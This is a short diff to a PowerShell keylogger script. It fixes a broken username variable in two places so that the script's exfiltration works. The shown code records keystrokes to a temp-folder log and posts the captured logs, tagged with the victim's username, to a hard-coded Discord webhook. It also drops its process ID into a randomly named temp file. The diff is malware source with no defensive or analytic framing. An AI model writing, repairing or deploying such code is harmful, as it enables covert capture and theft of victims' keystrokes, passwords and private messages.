@@ -8,7 +8,7 @@ $webhook = "https://discord.com/api/webhooks/1380976425208778935/BYngRi6W-bJS40m
 $PID > "$env:temp/DdBPKCytRe"
 
 # keylogger
-function KeyLogger($logFile="$env:temp/$env:User Name.log") {
+function KeyLogger($logFile="$env:temp/$env:UserName.log") {
   
   # generate log file if it doesn't exist
   if (-not (Test-Path $logFile)) {
@@ -53,7 +53,7 @@ function KeyLogger($logFile="$env:temp/$env:User Name.log") {
     # send logs via webhook
     $logs = Get-Content "$logFile" | Out-String
     $Body = @{
-      'username' = $env:User Name
+      'username' = $env:UserName
       'content' = $logs
     }
     Invoke-RestMethod -Uri $webhook -Method 'post' -Body $Body
